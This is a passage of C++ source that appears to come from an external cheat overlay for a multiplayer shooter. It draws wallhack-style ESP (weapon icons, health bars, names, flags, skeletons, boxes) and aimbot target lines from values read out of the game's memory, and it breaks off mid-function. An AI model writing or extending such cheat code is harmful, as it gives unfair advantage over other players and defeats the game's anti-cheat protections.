														continue;
													}
													else if (wep == u8"ﺭﻮﻓ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand2, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﺮﺟﺪﺑ ﻲﻧﺎﻫ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand42, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺳ 81 ﻲﺑ" || wep == u8"16 ﺩﺯ ﻲﻓ" || wep == u8"5981 ﺭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand32, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"ﻦﺟ ﺮﻴﻠﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand46, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"1191 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand48, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"54 ﺭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand45, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"29 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand50, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"ﻞﺠﻳﺍ ﺕﺮﻳﺰﻳﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand44, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == u8"ﻮﻳ ﻲﺑ ﻮﻴﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand26, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"ﺭﺍ ﻝﺍ ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand14, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"ﺱﺍ ﻲﻛ ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand13, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"41 ﻲﻨﻴﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand27, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"41 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand4, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"ﺱﺍ ﺱﺍ ﻲﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand17, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"49 ﻦﻳﻭ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand33, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"21 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand49, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"ﻝﺍ ﺭﺎﻜﺳﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand6, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"M16A4")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand3, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"74 ﻲﻛ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand10, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺳ 63 ﻲﺟ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand29, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﺩﺯ ﻲﺑ ﻮﻴﻛ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand8, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﺍﺯﻭﺮﺟ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand5, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"82 ﻲﺑ ﻱﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand9, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺳ ﻲﻛ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand25, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"3 ﻲﺟ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand43, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"09 ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand54, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﺑ ﻡﺍ ﻮﻳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand18, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"91 ﻲﺑ ﻲﺑ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand30, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻱﺯﻭﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand31, Screen.X - 30, Screen.Y - 55, 35, 20);
														continue;
													}
													else if (wep == u8"ﻦﺟ ﻲﻣﻮﺗ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand34, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﺭﻮﺘﻜﻴﻓ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﻛ 5 ﻲﺑ ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand51, Screen.X - 30, Screen.Y - 55, 50, 20);
														continue;
													}
													else if (wep == u8"ﻑﻭﺍ ﺩﺍﻮﺳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand36, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"7981 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand12, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"686 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand16, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"4101 ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand56, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻲﻛ 21 ﺱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand11, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"21 ﻲﺑ ﻱﺩ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand38, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﺔﻠﺒﻨﻗ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand19, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻙﻮﻤﺳ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand20, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"ﻑﻮﺗﻮﻟﻮﻣ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand21, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"CrossBow")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand37, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"ﺭﺍ ﻡﺍ ﻱﺍ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"Dagger")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand58, Screen.X - 30, Screen.Y - 55, 60, 20);
														continue;
													}
													else if (wep == u8"Zombie Blade")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand59, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
													else if (wep == u8"Zombie Hammer")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand60, Screen.X - 30, Screen.Y - 55, 80, 20);
														continue;
													}
												}
											}
										}
									}
									if (Setting::MAgicline)
									{
										currIndex = Memory::AimFindBestTarget();
										if (MAgiclinee == 0)
										{

											if (AActor.Address == Setting::CurrentTargetAddress)
											{

												DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height, Screen.X + 5, (Screen.Y + 15 + Screen.Z) - 10, Colors::magicline, 0.5f);

											}
										}
										else if (MAgiclinee == 1)
										{


											if (AActor.Address == Setting::CurrentTargetAddress)
											{
												if (Setting::curraim == 0)
												{
													DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height / 2, Head.X, Head.Y, Colors::magicline, 0.7f);
												}
												else if (Setting::curraim == 1)
												{
													DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height / 2, Chest.X, Chest.Y, Colors::magicline, 0.7f);
												}
												else if (Setting::curraim == 2)
												{
													DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height / 2, Pelvis.X, Pelvis.Y, Colors::magicline, 0.7f);
												}
												else if (Setting::curraim == 3)
												{
													DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height / 2, Pelvis.X, Pelvis.Y, Colors::magicline, 0.7f);
												}
											}

										}
									}
								}
								else if (!AActor.IsBot)
								{




									if (Setting::pline)
									{
										if (Setting::plineColorVer == 0)
										{

											if (AActor.Visible == 1)
											{
												DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, 0, Screen.X, Screen.Y - 5, ImColor(Setting::botlinecoloropen[0], Setting::botlinecoloropen[1], Setting::botlinecoloropen[2], Setting::botlinecoloropen[3]), Setting::plinesize);
											}
											else if (AActor.Visible == 0)
											{
												DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, 0, Screen.X, Screen.Y - 5, ImColor(Setting::botlinecolorcover[0], Setting::botlinecolorcover[1], Setting::botlinecolorcover[2], Setting::botlinecolorcover[3]), Setting::plinesize);
											}
										}
										//f (Setting::botlineColorVer == 0)
										//
										//   DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, 0, Screen.X, Screen.Y - 5, ImColor(Setting::botlinecolor[0], Setting::botlinecolor[1], Setting::botlinecolor[2], Setting::botlinecolor[3]), Setting::plinesize);
										//   
										//	
										else if (Setting::plineColorVer == 1)
										{

											DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, 0, Screen.X, Screen.Y - 5, linescolors, Setting::plinesize);

										}
									}



									if (Setting::phealth)
									{
										if (Setting::EspStyle == 0)
										{
											if (AActor.Health > 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Green);
											}
											else if (AActor.Health > 30.0 && AActor.Health <= 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Yellow);
											}
											else if (AActor.Health > 0.0 && AActor.Health <= 30.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Red);

											}
											else  if (AActor.Health <= 0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.KnockedHealth / AActor.HealthMax, DX11::ImGui_DX11::Color::Red);
											}
											//DX11::ImGui_DX11::DrawUnFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 3, (Screen.Z + 5), DX11::ImGui_DX11::Color::Black);
										}
										else if (Setting::EspStyle == 1)
										{
											DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 10, healthBarWidth, 3, DX11::ImGui_DX11::Color::Black);

											if (AActor.Health > 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 10, (healthBarWidth * AActor.Health / AActor.HealthMax), 3, DX11::ImGui_DX11::Color::Green);
											}
											if (AActor.Health > 30.0 && AActor.Health <= 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 10, (healthBarWidth * AActor.Health / AActor.HealthMax), 3, DX11::ImGui_DX11::Color::Yellow);
											}
											if (AActor.Health > 0.0 && AActor.Health <= 30.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 10, (healthBarWidth * AActor.Health / AActor.HealthMax), 3, DX11::ImGui_DX11::Color::Red);
											}
											else  if (AActor.Health <= 0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 33, Screen.Y - 10, (healthBarWidth * AActor.KnockedHealth / AActor.HealthMax), 3, DX11::ImGui_DX11::Color::Red);

											}
										}
										else if (Setting::EspStyle == 2)
										{
											if (!AActor.IsBot)
											{
												float rounding = 3.0f;

												DX11::ImGui_DX11::DrawUnFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, 100, 20, DX11::ImGui_DX11::Color::Black2, rounding);
												if (AActor.Health > 70.0)
												{
													DX11::ImGui_DX11::DrawFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, (100 * AActor.Health / AActor.HealthMax), 20, DX11::ImGui_DX11::Color::Green2, rounding);
												}
												if (AActor.Health > 30.0 && AActor.Health <= 70.0)
												{
													DX11::ImGui_DX11::DrawFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, (100 * AActor.Health / AActor.HealthMax), 20, DX11::ImGui_DX11::Color::Yellow2, rounding);
												}
												if (AActor.Health > 0.0 && AActor.Health <= 30.0)
												{
													DX11::ImGui_DX11::DrawFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, (100 * AActor.Health / AActor.HealthMax), 20, DX11::ImGui_DX11::Color::Red2, rounding);
												}
												else  if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawFilledRectangleCurved(Screen.X + xpos, Screen.Y + ypos, (100 * AActor.KnockedHealth / AActor.HealthMax), 20, DX11::ImGui_DX11::Color::Red2, rounding);

												}
											}

										}
										else if (Setting::EspStyle == 3)
										{
											if (AActor.Health > 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Green);
											}
											else if (AActor.Health > 30.0 && AActor.Health <= 70.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Yellow);
											}
											else if (AActor.Health > 0.0 && AActor.Health <= 30.0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.Health / AActor.HealthMax, DX11::ImGui_DX11::Color::Red);

											}
											else  if (AActor.Health <= 0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 2, (Screen.Z + 5) * AActor.KnockedHealth / AActor.HealthMax, DX11::ImGui_DX11::Color::Red);
											}
											DX11::ImGui_DX11::DrawUnFilledRectangle(Screen.X - (Screen.Z / 4) - 4, (Screen.Y - 5) + (Screen.Z + 5), 3, (Screen.Z + 5), DX11::ImGui_DX11::Color::Black);

										}
									}
									if (Setting::pname)
									{
										if (Setting::EspStyle == 0)
										{
											if (AActor.Health <= 0)
											{
												DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 40, (Screen.Y + Screen.Z) + 3, DX11::ImGui_DX11::Color::Red, temp.c_str(), nsize, false);
											}
											else
											{
												DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 40, (Screen.Y + Screen.Z) + 3, ImColor(Setting::pnamecolorcolor[0], Setting::pnamecolorcolor[1], Setting::pnamecolorcolor[2], Setting::pnamecolorcolor[3]), temp.c_str(), nsize, false);
											}
										}
										else if (Setting::EspStyle == 1)
										{
											if (AActor.Health <= 0)
											{


												DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 40, Screen.Y - 30, DX11::ImGui_DX11::Color::Red, temp.c_str(), nsize, false);


											}
											else
											{

												//DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 10, Screen.Y - 8, 100, 10, linescolors);
												DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 40, Screen.Y - 30, ImColor(Setting::pnamecolorcolor[0], Setting::pnamecolorcolor[1], Setting::pnamecolorcolor[2], Setting::pnamecolorcolor[3]), temp.c_str(), nsize, false);


											}
										}
										else if (Setting::EspStyle == 2)
										{
											if (AActor.Health <= 0)
											{


												DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 40, Screen.Y - 26, DX11::ImGui_DX11::Color::Red, temp.c_str(), nsize, false);


											}
											else
											{

												DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 40, Screen.Y - 26, ImColor(Setting::pnamecolorcolor[0], Setting::pnamecolorcolor[1], Setting::pnamecolorcolor[2], Setting::pnamecolorcolor[3]), temp.c_str(), nsize, false);


											}
										}
										else if (Setting::EspStyle == 3)
										{
											if (NameBgStyle == 0)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 50, Screen.Y - 12, namebgBarWidth, 17, ImColor(Setting::pnamebgcolorcolor[0], Setting::pnamebgcolorcolor[1], Setting::pnamebgcolorcolor[2], Setting::pnamebgcolorcolor[3]));
											}
											else if (NameBgStyle == 1)
											{
												DX11::ImGui_DX11::DrawFilledRectangle(Screen.X + 50, Screen.Y - 12, namebgBarWidth, 17, linescolors);
											}

											if (AActor.Health <= 0)
											{


												DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 40, Screen.Y - 26, DX11::ImGui_DX11::Color::Red, temp.c_str(), nsize, false);


											}
											else
											{

												DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 40, Screen.Y - 26, ImColor(Setting::pnamecolorcolor[0], Setting::pnamecolorcolor[1], Setting::pnamecolorcolor[2], Setting::pnamecolorcolor[3]), temp.c_str(), nsize, false);


											}
										}

									}
									if (Setting::pflag)
									{
										if (FlagStyle == 0)
										{
											if (WeaponStyle == 0)
											{
												if (Setting::EspStyle == 0)
												{
													if (!AActor.IsBot)
													{
														NationFlag(Screen, AActor, 8, 35, 20, 10);
													}
												}
												else if (Setting::EspStyle == 1)
												{
													if (!AActor.IsBot)
													{
														NationFlag(Screen, AActor, 8, 60, 20, 10);
													}
												}
												else if (Setting::EspStyle == 2)
												{
													if (!AActor.IsBot)
													{
														NationFlag(Screen, AActor, 8, 60, 20, 10);
													}
												}
												else if (Setting::EspStyle == 3)
												{
													if (!AActor.IsBot)
													{
														NationFlag(Screen, AActor, 8, 60, 20, 10);
													}
												}
											}
											else if (WeaponStyle == 1)
											{
												if (Setting::EspStyle == 0)
												{
													if (!AActor.IsBot)
													{
														NationFlag(Screen, AActor, 8, 50, 20, 10);
													}
												}
												else if (Setting::EspStyle == 1)
												{
													if (!AActor.IsBot)
													{
														NationFlag(Screen, AActor, 8, 75, 20, 10);
													}
												}
												else if (Setting::EspStyle == 2)
												{
													if (!AActor.IsBot)
													{
														NationFlag(Screen, AActor, 8, 75, 20, 10);
													}
												}
												else if (Setting::EspStyle == 3)
												{
													if (!AActor.IsBot)
													{
														NationFlag(Screen, AActor, 8, 75, 20, 10);
													}
												}
											}
										}
										else if (FlagStyle == 1)
										{
											if (WeaponStyle == 0)
											{
												if (Setting::EspStyle == 0)
												{
													if (!AActor.IsBot)
													{
														std::string Flag = AActor.Nation;
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 35, DX11::ImGui_DX11::Color::Red, true);
													}
												}
												else if (Setting::EspStyle == 1)
												{
													if (!AActor.IsBot)
													{
														std::string Flag = AActor.Nation;
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 60, DX11::ImGui_DX11::Color::Red, true);
													}
												}
												else if (Setting::EspStyle == 2)
												{
													if (!AActor.IsBot)
													{
														std::string Flag = AActor.Nation;
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 60, DX11::ImGui_DX11::Color::Red, true);
													}
												}
												else if (Setting::EspStyle == 3)
												{
													if (!AActor.IsBot)
													{
														std::string Flag = AActor.Nation;
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 60, DX11::ImGui_DX11::Color::Red, true);
													}
												}
											}
											else if (WeaponStyle == 1)
											{
												if (Setting::EspStyle == 0)
												{
													if (!AActor.IsBot)
													{
														std::string Flag = AActor.Nation;
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 50, DX11::ImGui_DX11::Color::Red, true);
													}
												}
												else if (Setting::EspStyle == 1)
												{
													if (!AActor.IsBot)
													{
														std::string Flag = AActor.Nation;
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 75, DX11::ImGui_DX11::Color::Red, true);
													}
												}
												else if (Setting::EspStyle == 2)
												{
													if (!AActor.IsBot)
													{
														std::string Flag = AActor.Nation;
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 75, DX11::ImGui_DX11::Color::Red, true);
													}
												}
												else if (Setting::EspStyle == 3)
												{
													if (!AActor.IsBot)
													{
														std::string Flag = AActor.Nation;
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, 15, Flag, Screen.X - 2, Screen.Y - 75, DX11::ImGui_DX11::Color::Red, true);
													}
												}
											}
										}

									}
									if (Setting::pcorner)
									{

										if (boxcolorver == 0)
										{
											if (boxver1 == 0)
											{

												DX11::ImGui_DX11::CornerBox(Screen.X - Screen.Z / 4 - 3, Screen.Y - 5, (Screen.Z / 2) + 3, Screen.Z + 5, Setting::pcornersize, popcorn / 2, ImColor(cornerboxcolor[0], cornerboxcolor[1], cornerboxcolor[2], cornerboxcolor[3]));
											}
											else if (boxver1 == 1)
											{
												DX11::ImGui_DX11::DrawRectangle(Screen.X - (Screen.Z / 4) - 3, Screen.Y - 5, (Screen.Z / 2) + 3, Screen.Z + 5, ImColor(cornerboxcolor[0], cornerboxcolor[1], cornerboxcolor[2], cornerboxcolor[3]), Setting::pfullboxsize);
											}
										}
										if (boxcolorver == 1)
										{
											if (boxver1 == 0)
											{

												DX11::ImGui_DX11::CornerBox(Screen.X - Screen.Z / 4 - 3, Screen.Y - 5, (Screen.Z / 2) + 3, Screen.Z + 5, Setting::pcornersize, popcorn / 2, linescolors);
											}
											else if (boxver1 == 1)
											{
												DX11::ImGui_DX11::DrawRectangle(Screen.X - (Screen.Z / 4) - 3, Screen.Y - 5, (Screen.Z / 2) + 3, Screen.Z + 5, linescolors, Setting::pfullboxsize);
											}
										}
									}
									if (Setting::id)
									{
										DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, 14, AActor.UID, Screen.X, (Screen.Y + Screen.Z) + 30, DX11::ImGui_DX11::Color::White, true);
									}




									if (Setting::playerBone)
									{
										if (Setting::playerBoneColorVer == 0)
										{
											if (AActor.Visible == 1)
											{

												if (isnull(Head) && isnull(Chest) && isnull(LEFTSHOULDER) && isnull(RIGHTSHOULDER) && isnull(LEFTELBOWROLL) && isnull(RIGHTELBOWROLL) && isnull(Pelvis) && isnull(LEFTLEGS) && isnull(RIGHTLEGS) && isnull(LEFTKNEEROLL) && isnull(RIGHTKNEEROLL) && isnull(LEFTFOOT) && isnull(RIGHTFOOT) && isnull(LEFTHAND) && isnull(RIGHTHAND))
												{
													DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 12, DX11::ImGui_DX11::Color::Yellow, Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, LEFTSHOULDER.X, LEFTSHOULDER.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, RIGHTSHOULDER.X, RIGHTSHOULDER.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTSHOULDER.X, LEFTSHOULDER.Y, LEFTELBOWROLL.X, LEFTELBOWROLL.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTSHOULDER.X, RIGHTSHOULDER.Y, RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTELBOWROLL.X, LEFTELBOWROLL.Y, LEFTHAND.X, LEFTHAND.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, RIGHTHAND.X, RIGHTHAND.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, LEFTLEGS.X, LEFTLEGS.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, RIGHTLEGS.X, RIGHTLEGS.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTLEGS.X, LEFTLEGS.Y, LEFTKNEEROLL.X, LEFTKNEEROLL.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTLEGS.X, RIGHTLEGS.Y, RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTKNEEROLL.X, LEFTKNEEROLL.Y, LEFTFOOT.X, LEFTFOOT.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, RIGHTFOOT.X, RIGHTFOOT.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												}


												//DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 13, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
